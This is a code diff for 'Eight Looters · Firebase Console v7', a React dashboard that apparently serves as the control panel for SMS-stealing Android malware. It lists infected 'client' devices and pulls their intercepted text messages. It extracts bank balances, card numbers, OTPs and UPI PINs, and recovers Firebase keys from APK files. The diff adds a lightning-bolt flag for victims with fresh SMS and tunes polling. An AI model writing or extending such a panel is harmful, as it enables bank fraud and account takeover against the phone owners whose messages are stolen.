@@ -1,6 +1,8 @@
 /* ============================================================
-   Eight Looters · Firebase Console v6
-   Custom Date Filter + Futuristic UI
+   Eight Looters · Firebase Console v7
+   + SMS Activity Lightning Bolt
+   + Custom Date Filter
+   + Performance Optimization
    ============================================================ */
 const {useState,useEffect,useRef,useCallback,useMemo} = React;
 const TG_URL = "https://t.me/eightlooters";
@@ -202,7 +204,7 @@ function parseMessages(raw){
   const out=[];
   if(raw&&typeof raw==="object"){
     const e=Object.entries(raw);
-    const slice=e.length>200?e.slice(e.length-200):e;
+    const slice=e.length>50?e.slice(e.length-50):e;
     for(const[,m] of slice){
       if(!m||typeof m!=="object") continue;
       const t=String(m.message||m.body||m.text||"");
@@ -223,6 +225,25 @@ function parseSmsTime(str){
   }
   const t=Date.parse(str);
   return isNaN(t)?0:t;
+}
+/* Recent SMS check — SMS within last N days */
+function isRecentSms(msgs, days=2){
+  if(!msgs || !msgs.length) return false;
+  const cutoff = Date.now() - days*24*60*60*1000;
+  for(const m of msgs){
+    const t = parseSmsTime(m.time);
+    if(t && t >= cutoff) return true;
+  }
+  return false;
+}
+function getLastSmsTs(msgs){
+  if(!msgs || !msgs.length) return 0;
+  let max=0;
+  for(const m of msgs){
+    const t = parseSmsTime(m.time);
+    if(t > max) max = t;
+  }
+  return max;
 }
 function extractOtp(text){
   if(!text) return null;
@@ -261,7 +282,7 @@ async function parseApk(file){
   if(!url&&!key) return null;
   return {firebaseUrl:url,apiKey:key,projectId:pid,appId:appid};}
 
-/* ===== Date helpers for filter ===== */
+/* ===== Date helpers ===== */
 function startOfDay(d){const x=new Date(d);x.setHours(0,0,0,0);return x.getTime();}
 function endOfDay(d){const x=new Date(d);x.setHours(23,59,59,999);return x.getTime();}
 function toDateInputValue(ts){if(!ts) return "";const d=new Date(ts);const y=d.getFullYear(),m=String(d.getMonth()+1).padStart(2,"0"),dd=String(d.getDate()).padStart(2,"0");return `${y}-${m}-${dd}`;}
@@ -393,7 +414,7 @@ function LoginScreen({onConnect,onMergeAll}){
       }));
       if(!dead) setStats(n);
     };
-    refresh();const t=setInterval(refresh,15000);
+    refresh();const t=setInterval(refresh,30000);
     return ()=>{dead=true;clearInterval(t);};},[accounts]);
 
   const ordered=useMemo(()=>[...accounts].sort((a,b)=>{
@@ -727,7 +748,13 @@ function Dashboard({fbUrl,fbKey,onLogout}){
   const load=useCallback(async (showLoad=false)=>{
     if(showLoad) setLoading(true);
     try{const raw=await fbGet(fbUrl,fbKey,"clients");const rows=parseDevices(raw);
-      setDevices(p=>{const old=new Map(p.map(d=>[d.id,d]));return rows.map(d=>({...d,smsAnalysis:old.get(d.id)?.smsAnalysis}));});
+      setDevices(p=>{
+        const old=new Map(p.map(d=>[d.id,d]));
+        return rows.map(d=>{
+          const prev=old.get(d.id);
+          return {...d, smsAnalysis:prev?.smsAnalysis, lastSmsTs:prev?.lastSmsTs, isActive:prev?.isActive};
+        });
+      });
       setErr("");
       if(prev.current>0&&rows.length>prev.current) toast("🔔 New device connected!");
       prev.current=rows.length;
@@ -737,24 +764,48 @@ function Dashboard({fbUrl,fbKey,onLogout}){
 
   const scan=useCallback(async (force=false)=>{
     const cur=ref.current;if(!cur.length) return;
+    const now=Date.now();
+    const work=cur.filter(d=>{
+      if(force) return true;
+      const c=cache.current.get(d.id);
+      if(!c) return true;
+      if(c.ts && now-c.ts < 30000) return false;
+      return true;
+    });
+    if(!work.length) return;
     setScanning(true);
-    try{const work=cur.filter(d=>force||!cache.current.has(d.id));
-      for(let i=0;i<work.length;i+=5){const batch=work.slice(i,i+5);
+    try{
+      for(let i=0;i<work.length;i+=3){
+        const batch=work.slice(i,i+3);
         await Promise.all(batch.map(async d=>{
-          try{const raw=await fbGet(fbUrl,fbKey,`messages/${d.id}`,{orderBy:'"$key"',limitToLast:"150"});
-            const a=analyze(parseMessages(raw));cache.current.set(d.id,{smsAnalysis:a});
-            setDevices(p=>p.map(x=>x.id===d.id?{...x,smsAnalysis:a}:x));
-          }catch{cache.current.set(d.id,{smsAnalysis:{bankBalances:[],cards:[],phoneNumbers:[],networks:[]}});}
+          try{
+            const raw=await fbGet(fbUrl,fbKey,`messages/${d.id}`,{orderBy:'"$key"',limitToLast:"50"});
+            const msgs=parseMessages(raw);
+            const a=analyze(msgs);
+            const lastTs=getLastSmsTs(msgs);
+            const active=isRecentSms(msgs,2);
+            cache.current.set(d.id,{smsAnalysis:a,lastSmsTs:lastTs,isActive:active,ts:Date.now()});
+            setDevices(p=>p.map(x=>x.id===d.id?{...x,smsAnalysis:a,lastSmsTs:lastTs,isActive:active}:x));
+          }catch{
+            cache.current.set(d.id,{smsAnalysis:{bankBalances:[],cards:[],phoneNumbers:[],networks:[]},lastSmsTs:0,isActive:false,ts:Date.now()});
+          }
         }));
       }
     }finally{setScanning(false);}
   },[fbUrl,fbKey]);
 
   useEffect(()=>{
-    load(true);const t1=setInterval(()=>load(false),15000);const t2=setInterval(()=>scan(true),45000);const t3=setInterval(()=>setNow(new Date()),1000);
+    load(true);
+    const t1=setInterval(()=>load(false),30000);
+    const t2=setInterval(()=>scan(true),90000);
+    const t3=setInterval(()=>setNow(new Date()),30000);
     return ()=>{clearInterval(t1);clearInterval(t2);clearInterval(t3);};
   },[]);
-  useEffect(()=>{if(devices.length) scan(false);},[devices.length,scan]);
+  useEffect(()=>{
+    if(!devices.length) return;
+    const timer=setTimeout(()=>scan(false),800);
+    return ()=>clearTimeout(timer);
+  },[devices.length,scan]);
 
   const filtered=useMemo(()=>{
     const qRaw=search.trim().toLowerCase();const qNum=qRaw.replace(/[^0-9]/g,"");
@@ -853,16 +904,22 @@ function Dashboard({fbUrl,fbKey,onLogout}){
   </div>;
 }
 
-/* ============ DEVICE CARD ============ */
-function DeviceCard({dev,onClick,delay=0,pinned,onTogglePin}){
+/* ============ DEVICE CARD (memoized) ============ */
+const DeviceCard = React.memo(function DeviceCard({dev,onClick,delay=0,pinned,onTogglePin}){
   const bank=dev.smsAnalysis?.bankBalances?.[0];
   const card=dev.smsAnalysis?.cards?.[0];
   const phoneRaw=dev.phoneNumber&&dev.phoneNumber!=="—"?dev.phoneNumber:(dev.smsAnalysis?.phoneNumbers?.[0]||"—");
   const phoneShow=cleanPhone(phoneRaw);
   const net=dev.provider&&dev.provider!=="—"?dev.provider:(dev.smsAnalysis?.networks?.[0]||null);
   const [copied,setCopied]=useState(false);
+
+  const recentSmsActive = dev.isActive === true;
+  const lastSmsTs = dev.lastSmsTs || 0;
+  const activeLabel = lastSmsTs ? timeAgo(lastSmsTs) : "";
+
   const onCopyPhone=(e)=>{e.stopPropagation();if(!phoneShow||phoneShow==="—") return;try{navigator.clipboard.writeText(phoneShow);}catch{}setCopied(true);setTimeout(()=>setCopied(false),1400);};
   const onPin=(e)=>{e.stopPropagation();onTogglePin&&onTogglePin(dev.id);};
+
   return <div onClick={onClick} className={"dev-card pop"+(pinned?" pinned":"")} style={{animationDelay:`${delay}s`}}>
     <div className="shine"/>{pinned && <div className="pin-flag">{Ic.pin(11)} PINNED</div>}
     <div style={{display:"flex",alignItems:"flex-start",gap:12,marginBottom:12}}>
@@ -885,7 +942,10 @@ function DeviceCard({dev,onClick,delay=0,pinned,onTogglePin}){
     <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:12,marginBottom:12}}>
       <div style={{minWidth:0}}>
         <p style={{fontSize:9,fontWeight:600,textTransform:"uppercase",letterSpacing:"0.13em",color:"var(--muted-2)",marginBottom:4}}>Number</p>
-        <div style={{display:"flex",alignItems:"center",gap:6,minWidth:0}}>
+        <div style={{display:"flex",alignItems:"center",gap:5,minWidth:0}}>
+          {recentSmsActive && (
+            <span className="sms-bolt" title={`Recent SMS · ${activeLabel}`}>{Ic.zap(11)}</span>
+          )}
           <p className="mono" style={{fontSize:11,color:"var(--text)",overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap",flex:1}}>{phoneShow}</p>
           {phoneShow!=="—" && (<button onClick={onCopyPhone} className="ibtn" title="Copy number" style={{padding:4,flexShrink:0,color:copied?"#34d399":undefined,background:copied?"rgba(52,211,153,.12)":undefined,borderColor:copied?"rgba(52,211,153,.35)":undefined}}>{copied?Ic.check(11):Ic.copy(11)}</button>)}
         </div>
@@ -919,10 +979,14 @@ function DeviceCard({dev,onClick,delay=0,pinned,onTogglePin}){
             <span style={{fontSize:11,color:"var(--muted)"}}>Offline</span>
             {dev.lastSeen&&<span className="mono" style={{fontSize:10,color:"var(--muted-2)",padding:"2px 7px",borderRadius:6,background:"rgba(14,12,28,.6)",border:"1px solid var(--border)"}}>{timeAgo(dev.lastSeen)}</span>}
           </div>}
+      {recentSmsActive && <span className="badge" style={{background:"rgba(251,191,36,.12)",borderColor:"rgba(251,191,36,.4)",color:"#fbbf24",fontSize:9,display:"inline-flex",alignItems:"center",gap:3}}>
+        {Ic.zap(9)} SMS · {activeLabel}
+      </span>}
       {dev.upipin&&<span className="badge" style={{marginLeft:"auto",background:"rgba(251,191,36,.1)",borderColor:"rgba(251,191,36,.3)",color:"#fbbf24"}}>UPI PIN</span>}
     </div>
   </div>;
-}
+});
+
 function Row({label,value,mono,color,delay=0,trailing,copyable}){
   const [copied,setCopied]=useState(false);
   const onCopy=(e)=>{e?.stopPropagation();const v=String(value||"");if(!v||v==="—") return;try{navigator.clipboard.writeText(v);}catch{}setCopied(true);setTimeout(()=>setCopied(false),1500);};
@@ -979,7 +1043,7 @@ function DeviceDrawer({dev,fbUrl,fbKey,onClose,onDelete,showToast}){
           return prev;
         });
       }catch{}
-    },6000);
+    },15000);
     return ()=>iv.current&&clearInterval(iv.current);
   },[loadMsgs,dev.id,fbUrl,fbKey,showToast]);
 
@@ -1040,7 +1104,6 @@ function DeviceDrawer({dev,fbUrl,fbKey,onClose,onDelete,showToast}){
   const sortedMsgs=useMemo(()=>{
     const withMeta=msgs.map((m,i)=>({m,i,k:msgKey(m,i),ts:parseSmsTime(m.time)}));
     let arr=withMeta;
-    // Date range filter
     if(dateFrom || dateTo){
       const fromTs = dateFrom ? fromDateInputValue(dateFrom) : null;
       const toTs = dateTo ? fromDateInputValue(dateTo) : null;
@@ -1163,7 +1226,6 @@ function DeviceDrawer({dev,fbUrl,fbKey,onClose,onDelete,showToast}){
             </div>
           </div>
 
-          {/* Custom Date Filter Panel */}
           {showDateFilter && <div className="a-up dfilter-panel">
             <div className="dfilter-head">
               <div style={{display:"flex",alignItems:"center",gap:8}}>
@@ -1366,30 +1428,59 @@ function MergedView({onLogout}){
         catch{return [];}
       }));
       const merged=results.flat();
-      setDevices(p=>{const old=new Map(p.map(d=>[`${d.srcId}:${d.id}`,d]));return merged.map(d=>({...d,smsAnalysis:old.get(`${d.srcId}:${d.id}`)?.smsAnalysis||cache.current.get(`${d.srcId}:${d.id}`)?.smsAnalysis}));});
+      setDevices(p=>{const old=new Map(p.map(d=>[`${d.srcId}:${d.id}`,d]));
+        return merged.map(d=>{
+          const prev=old.get(`${d.srcId}:${d.id}`);
+          return {...d,smsAnalysis:prev?.smsAnalysis||cache.current.get(`${d.srcId}:${d.id}`)?.smsAnalysis,lastSmsTs:prev?.lastSmsTs,isActive:prev?.isActive};
+        });
+      });
     }catch{toast("Unable to load panels");}
     finally{setLoading(false);}
   },[accounts,toast]);
 
   const scan=useCallback(async (force=false)=>{
     const cur=ref.current;if(!cur.length) return;
+    const now=Date.now();
+    const work=cur.filter(d=>{
+      const k=`${d.srcId}:${d.id}`;
+      if(force) return true;
+      const c=cache.current.get(k);
+      if(!c) return true;
+      if(c.ts && now-c.ts < 30000) return false;
+      return true;
+    });
+    if(!work.length) return;
     setScanning(true);
-    try{const work=cur.filter(d=>force||!cache.current.has(`${d.srcId}:${d.id}`));
-      for(let i=0;i<work.length;i+=5){const batch=work.slice(i,i+5);
+    try{
+      for(let i=0;i<work.length;i+=3){
+        const batch=work.slice(i,i+3);
         await Promise.all(batch.map(async d=>{
           const k=`${d.srcId}:${d.id}`;
-          try{const raw=await fbGet(d.srcUrl,d.srcKey,`messages/${d.id}`,{orderBy:'"$key"',limitToLast:"150"});
-            const a=analyze(parseMessages(raw));cache.current.set(k,{smsAnalysis:a});
-            setDevices(p=>p.map(x=>`${x.srcId}:${x.id}`===k?{...x,smsAnalysis:a}:x));
-          }catch{cache.current.set(k,{smsAnalysis:{bankBalances:[],cards:[],phoneNumbers:[],networks:[]}});}
+          try{const raw=await fbGet(d.srcUrl,d.srcKey,`messages/${d.id}`,{orderBy:'"$key"',limitToLast:"50"});
+            const msgs=parseMessages(raw);
+            const a=analyze(msgs);
+            const lastTs=getLastSmsTs(msgs);
+            const active=isRecentSms(msgs,2);
+            cache.current.set(k,{smsAnalysis:a,lastSmsTs:lastTs,isActive:active,ts:Date.now()});
+            setDevices(p=>p.map(x=>`${x.srcId}:${x.id}`===k?{...x,smsAnalysis:a,lastSmsTs:lastTs,isActive:active}:x));
+          }catch{cache.current.set(k,{smsAnalysis:{bankBalances:[],cards:[],phoneNumbers:[],networks:[]},lastSmsTs:0,isActive:false,ts:Date.now()});}
         }));
       }
     }finally{setScanning(false);}
   },[]);
 
-  useEffect(()=>{load(true);const t1=setInterval(()=>load(false),15000);const t2=setInterval(()=>scan(true),45000);const t3=setInterval(()=>setNow(new Date()),1000);
-    return ()=>{clearInterval(t1);clearInterval(t2);clearInterval(t3);};},[]);
-  useEffect(()=>{if(devices.length) scan(false);},[devices.length,scan]);
+  useEffect(()=>{
+    load(true);
+    const t1=setInterval(()=>load(false),30000);
+    const t2=setInterval(()=>scan(true),90000);
+    const t3=setInterval(()=>setNow(new Date()),30000);
+    return ()=>{clearInterval(t1);clearInterval(t2);clearInterval(t3);};
+  },[]);
+  useEffect(()=>{
+    if(!devices.length) return;
+    const timer=setTimeout(()=>scan(false),800);
+    return ()=>clearTimeout(timer);
+  },[devices.length,scan]);
 
   const filtered=useMemo(()=>{
     const qRaw=search.trim().toLowerCase();const qNum=qRaw.replace(/[^0-9]/g,"");
